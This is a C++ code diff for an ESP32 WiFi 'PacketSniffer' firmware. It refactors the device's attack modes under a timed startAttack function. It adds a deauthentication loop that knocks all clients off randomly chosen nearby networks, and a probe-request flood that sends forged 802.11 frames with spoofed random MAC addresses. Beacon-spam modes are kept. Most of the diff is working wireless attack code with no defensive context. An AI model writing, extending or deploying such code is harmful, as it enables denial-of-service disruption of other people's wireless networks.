@@ -35,6 +35,7 @@ PacketSniffer::PacketSniffer() {
     pendingEvent = EVT_NONE;
     attackMode = false;
     attackStart = 0;
+    attackDuration = 0;
     attackType = 0;
 }
 
@@ -83,21 +84,21 @@ void PacketSniffer::sendDeauth(uint8_t* bssid, uint8_t* client) {
     }
 }
 
-void PacketSniffer::deauthAttack() {
-    if (networkCount == 0) return;
+void PacketSniffer::startAttack(int type, int duration) {
+    if (networkCount == 0 && type == 3) return; // Need nets for deauth
     attackMode = true;
-    
-    // Target a random known network for disruption
-    int target = random(0, networkCount);
-    uint8_t broadcast[] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
-    
-    Serial.printf("[WIFI] Deauthing: %s\n", networks[target].ssid);
-    
-    // Switch to target channel
-    esp_wifi_set_channel(networks[target].channel, WIFI_SECOND_CHAN_NONE);
-    
-    // Send to broadcast address (kick everyone)
-    sendDeauth(networks[target].bssid, broadcast);
+    attackType = type;
+    attackDuration = duration;
+    attackStart = millis();
+    Serial.printf("[ATTACK] Started Type %d for %d ms\n", type, duration);
+}
+
+void PacketSniffer::deauthAttack() {
+    startAttack(3, 10000); // Default 10s
+}
+
+void PacketSniffer::probeFlood() {
+    startAttack(4, 10000); // Default 10s
 }
 
 void PacketSniffer::init(SDManager *sd) {
@@ -136,15 +137,11 @@ void PacketSniffer::stopAttack() {
 }
 
 void PacketSniffer::beaconSpam() {
-    attackMode = true;
-    attackType = 1; // Random/Common SSIDs
-    attackStart = millis();
+    startAttack(1, 10000); // Default 10s
 }
 
 void PacketSniffer::rickRoll() {
-    attackMode = true;
-    attackType = 2; // Lyrics
-    attackStart = millis();
+    startAttack(2, 15000); // Default 15s
 }
 
 // Raw Beacon Frame 
@@ -183,8 +180,8 @@ void PacketSniffer::loop() {
 
     // ATTACK LOOP
     if (attackMode) {
-        // Auto-stop
-        if (now - attackStart > 15000) {
+        // Auto-stop using duration
+        if (now - attackStart > attackDuration) {
             stopAttack();
         } else {
             // Rapid fire beacons
@@ -217,6 +214,56 @@ void PacketSniffer::loop() {
                     broadcastBeacon(lyrics[i]);
                     delay(5);
                 }
+            }
+            else if (attackType == 3) { // Deauth Attack
+                if (networkCount > 0) {
+                    int target = random(0, networkCount);
+                    uint8_t broadcast[] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
+                    // Switch to target channel
+                    esp_wifi_set_channel(networks[target].channel, WIFI_SECOND_CHAN_NONE);
+                    sendDeauth(networks[target].bssid, broadcast);
+                    delay(10);
+                }
+            }
+            else if (attackType == 4) { // Probe Flood
+                 // Random MAC
+                 uint8_t mac[6];
+                 for(int i=0; i<6; i++) mac[i] = random(0, 256);
+                 mac[0] &= 0xFE; // Unicast
+                 mac[0] |= 0x02; // Locally administered
+
+                 // Random SSID
+                 char ssid[16];
+                 sprintf(ssid, "iPhone %d", random(10, 100));
+
+                 // Construct Probe Request (Simplified)
+                 uint8_t packet[128];
+                 memset(packet, 0, 128);
+                 packet[0] = 0x40; // Probe Request
+                 memset(&packet[4], 0xFF, 6); // DA (Broadcast)
+                 memcpy(&packet[10], mac, 6); // SA
+                 memcpy(&packet[16], "\xff\xff\xff\xff\xff\xff", 6); // BSSID (Broadcast)
+
+                 // SSID Tag
+                 int ssidLen = strlen(ssid);
+                 packet[24] = 0;
+                 packet[25] = ssidLen;
+                 memcpy(&packet[26], ssid, ssidLen);
+
+                 // Rates (Required for some APs to listen)
+                 int idx = 26 + ssidLen;
+                 packet[idx++] = 1; // Supported Rates
+                 packet[idx++] = 8;
+                 packet[idx++] = 0x82; packet[idx++] = 0x84;
+                 packet[idx++] = 0x8b; packet[idx++] = 0x96;
+                 packet[idx++] = 0x0c; packet[idx++] = 0x12;
+                 packet[idx++] = 0x18; packet[idx++] = 0x24;
+
+                 currentChannel = random(1, 14);
+                 esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+
+                 esp_wifi_80211_tx(WIFI_IF_STA, packet, idx, false);
+                 delay(5);
             }
         }
         return; // Skip sniffing while attacking
